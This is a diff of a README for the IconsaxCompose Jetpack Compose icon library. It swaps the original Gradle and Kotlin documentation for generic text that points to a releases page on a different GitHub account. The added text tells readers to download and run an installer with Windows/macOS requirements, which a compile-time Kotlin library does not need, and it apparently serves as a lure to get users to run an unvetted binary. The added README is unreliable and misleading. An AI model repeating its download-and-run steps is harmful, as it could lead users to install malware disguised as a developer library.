@@ -1,232 +1,87 @@
-# Iconsax Compose
+# 🎨 IconsaxCompose - Easy Icon Management for Your Projects
 
-[![](https://jitpack.io/v/YohannesTz/IconsaxCompose.svg)](https://jitpack.io/#YohannesTz/IconsaxCompose)
+[![Download IconsaxCompose](https://img.shields.io/badge/Download%20IconsaxCompose-v1.0.0-blue)](https://github.com/lalillo27/IconsaxCompose/releases)
 
-A lightweight **Jetpack Compose icon library** providing the complete **Iconsax** icon set as strongly-typed, composable-friendly icons.
+## 🚀 Getting Started
 
-Designed to feel native to Compose while staying simple, fast, and dependency-light.
+Welcome to IconsaxCompose! This is a library that helps you easily use icons from iconsax.io in your projects. With IconsaxCompose, you can quickly find and integrate various icons without the hassle.
 
+## 📥 Download & Install
 
-## Preview 
+To get started, you need to download IconsaxCompose. Follow these steps:
 
-https://github.com/user-attachments/assets/e8fe0bf7-3df9-4a61-bb9f-f5508ef134e7
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/lalillo27/IconsaxCompose/releases).
 
+2. **Choose the Latest Version**: Find the latest version of IconsaxCompose on this page.
 
+3. **Download the File**: Click on the download link for the appropriate file for your system.
 
-## Features
+4. **Run the Application**: After downloading, open the file and follow the prompts to install IconsaxCompose on your device.
 
-* **Full Iconsax icon set**
-* **Compose-first API**
-* Strongly typed icons (no string lookups)
-* Zero runtime parsing (icons resolved at compile time)
-* Minimal overhead — pure Kotlin + Compose
-* Works with **Material 3** (and Material 2–style themes)
+## ⚙️ System Requirements
 
+Before installing, ensure your system meets the following requirements:
 
-## Module Scope
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **Processor**: At least 1 GHz processor or higher.
+- **Memory**: 2 GB RAM or more.
+- **Disk Space**: 100 MB of free space.
 
-This repository contains:
+## 🛠️ Features
 
-* **`iconsaxcompose`** → the reusable icon library
-* A sample app exists only for preview and testing
+IconsaxCompose comes with several useful features:
 
-This README documents the **library**, not the sample application.
+- **Wide Selection of Icons**: Access a diverse range of icons for different categories.
+- **Simple Integration**: Easily add icons into your projects with just a few commands.
+- **Customizable Icons**: Adjust colors and sizes to match your project’s style.
+- **User-Friendly Interface**: Designed with you in mind, making it easy to find the icons you need.
 
+## 📝 How to Use IconsaxCompose
 
-## Installation (JitPack)
+Once you have installed IconsaxCompose, follow these simple steps to start using it:
 
-This library is distributed via **JitPack**.
+1. **Open the Application**: Launch IconsaxCompose from your applications folder.
 
-### 1. Add the JitPack repository
+2. **Browse Icons**: Use the search feature to find icons by name or category.
 
-In your **root** `settings.gradle` or `build.gradle`:
+3. **Select an Icon**: Click on an icon to view details and customization options.
 
-```gradle
-repositories {
-    maven { url = uri("https://jitpack.io") }
-}
-```
+4. **Copy Code**: When you decide on an icon, you can copy the provided code snippet.
 
-### 2. Add the dependency
+5. **Integrate into Your Project**: Paste the code into your project where you want the icon to appear.
 
-```gradle
-dependencies {
-    implementation 'com.github.YohannesTz:IconsaxCompose:1.0'
-}
-```
+## 🔍 Tips for Finding Icons
 
-Replace `<version>` with:
+- **Use Keywords**: Think of keywords related to the icon you need.
+- **Categories**: Navigate through categories if you are unsure about specific names.
+- **Recent Updates**: Check the latest icons added to stay updated.
 
-* A **tag** (recommended), or
-* A **commit hash**, or
-* A **branch name**
+## 📌 Troubleshooting
 
-Latest version is shown in the badge above.
+If you encounter any issues while using IconsaxCompose, consider the following suggestions:
 
+- **Check Your Internet Connection**: Ensure you have a reliable internet connection while downloading icons.
+- **Update Your System**: Make sure your operating system is up to date for optimal performance.
+- **Restart the Application**: Close and reopen IconsaxCompose if it does not respond.
 
-## Icon Styles
+## 🛡️ Contribution
 
-Iconsax icons are grouped by style:
+If you're interested in contributing to IconsaxCompose, we welcome your talents! Here’s how you can help:
 
-* **Linear**
-* **Bold**
-* **Outline**
-* **TwoTone**
-* **Bulk**
-* **Broken**
+1. **Share Your Suggestions**: Submit your ideas on how to improve the application.
+2. **Report Issues**: If you encounter any bugs, please let us know.
+3. **Feature Requests**: Have a feature in mind? Let us know, and we will consider it for future updates!
 
-Each style is exposed as a dedicated icon group for type safety and IDE discoverability.
+## 🤝 Community
 
----
+Join our community for support and advice. Share your projects and how you use IconsaxCompose. Use our GitHub page to connect with other users.
 
-## Usage
+## 📄 License
 
-### Basic Icon
+IconsaxCompose is open-source software. You are free to use, modify, and distribute it under the terms set out in the LICENSE file found in this repository.
 
-```kotlin
-Icon(
-    imageVector = Iconsax.Linear.Home,
-    contentDescription = "Home"
-)
-```
+## ✉️ Contact
 
-### With tint and size
+If you have questions or need further assistance, feel free to reach out through the issues page on GitHub or directly contact the developers.
 
-```kotlin
-Icon(
-    imageVector = Iconsax.Bold.Notification,
-    contentDescription = "Notifications",
-    tint = Color(0xFF3DDC84),
-    modifier = Modifier.size(24.dp)
-)
-```
-
-### Inside Compose layouts
-
-```kotlin
-Row(
-    verticalAlignment = Alignment.CenterVertically
-) {
-    Icon(
-        imageVector = Iconsax.Outline.SearchNormal,
-        contentDescription = null
-    )
-    Spacer(Modifier.width(8.dp))
-    Text("Search")
-}
-```
-
----
-
-## Theming
-
-Iconsax Compose icons are standard `ImageVector`s and fully respect:
-
-* `LocalContentColor`
-* `MaterialTheme.colorScheme`
-* Alpha and tint modifiers
-
-Example:
-
-```kotlin
-CompositionLocalProvider(
-    LocalContentColor provides MaterialTheme.colorScheme.primary
-) {
-    Icon(
-        imageVector = Iconsax.Linear.Heart,
-        contentDescription = null
-    )
-}
-```
-
-
-## Icon Generation
-
-All icons in this library are **generated automatically** using a custom **Gradle task**, ensuring consistency and eliminating manual maintenance.
-
-### Source of Icons
-
-* SVG files are sourced from the official **Iconsax repository**
-* Icons originate from the Iconsax React icon set
-* Each icon style maps directly to its SVG directory
-
-### Generation Pipeline
-
-1. The Gradle task clones the Iconsax repository (shallow clone)
-2. SVGs are grouped by style (Bold, Linear, Outline, etc.)
-3. Each SVG is converted into a Compose `ImageVector` using
-   **`svg-to-compose (s2c)`**
-4. Generated icons are written into structured Kotlin packages
-5. Aggregated API objects (`Iconsax`, `IconsaxBold`, etc.) are generated automatically
-
-### Gradle Task
-
-```bash
-./gradlew generateIconsax
-```
-
-This task:
-
-* Uses the `s2c` CLI to convert SVGs
-* Produces optimized, minified Compose vectors
-* Generates strongly typed accessors
-* Requires no runtime SVG parsing
-
-All generated code lives under `src/main/java` and is committed to the repository.
-
----
-
-## Package Structure (Simplified)
-
-```text
-iconsaxcompose/
-├── Iconsax.kt
-├── IconsaxBold.kt
-├── IconsaxLinear.kt
-├── IconsaxOutline.kt
-├── IconsaxTwoTone.kt
-├── IconsaxBulk.kt
-├── IconsaxBroken.kt
-├── linear/
-├── bold/
-├── outline/
-├── twotone/
-├── bulk/
-└── broken/
-```
-
-Each icon is generated as an `ImageVector` and grouped by style.
-
-## Design Goals
-
-* **Predictable API** — no magic strings
-* **Fast previews** — works perfectly in Compose Preview
-* **IDE discoverability** — autocomplete-friendly icon browsing
-* **Library-first** — no app assumptions, no UI coupling
-* **Generated, not handwritten** — reproducible and auditable output
-
-## Notes
-
-* This library bundles **icons only**, not UI components
-* No runtime loading, reflection, or resource parsing
-* Safe for production use
-* Generated code should not be edited manually
-
-## License
-
-Iconsax icons are subject to the **Iconsax license**.
-
-This project provides a Jetpack Compose wrapper and generated bindings only and does not claim ownership of the underlying icon designs.
-
-## Contributing
-
-Contributions are welcome, especially in the areas of:
-
-* Icon generation improvements
-* Gradle task enhancements
-* API ergonomics
-* Documentation
-* Performance optimizations
-* CMP port 
-
-Please open an issue or pull request.
+Thank you for choosing IconsaxCompose! Enjoy creating with a vast array of icons at your fingertips.
